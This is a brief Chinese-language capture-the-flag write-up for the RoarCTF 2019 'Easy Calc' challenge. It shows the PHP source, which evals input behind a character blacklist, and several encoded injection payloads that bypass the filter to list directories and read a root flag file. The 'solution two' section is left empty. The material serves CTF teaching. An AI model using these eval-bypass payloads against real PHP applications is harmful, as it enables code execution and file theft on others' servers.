# \[RoarCTF 2019]Easy Calc

## \[RoarCTF 2019]Easy Calc

## 考点

* PHP7参数解析特性
* 代码执行bypass

## wp

访问calc.php看到源码

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

### 解法一

* 利用 php 的解析特性，以及补数编码或者异或编码进行绕过
* 以下payload在`?`后有个空格
* `? num=1;var_dump(scandir((~%D1%D0)))` 扫描当前目录
* `? num=1;var_dump(scandir((~%D0)))` 扫描根目录，发现 flag 文件 flagg
* `? num=1;var_dump(readfile((~%D0%99%CE%9E%98%98)))` 读取 flag
* 或者利用chr函数将非法字符串进行编码
* `? num=1;var_dump(scandir(chr(47)))`
* `? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

### 解法二

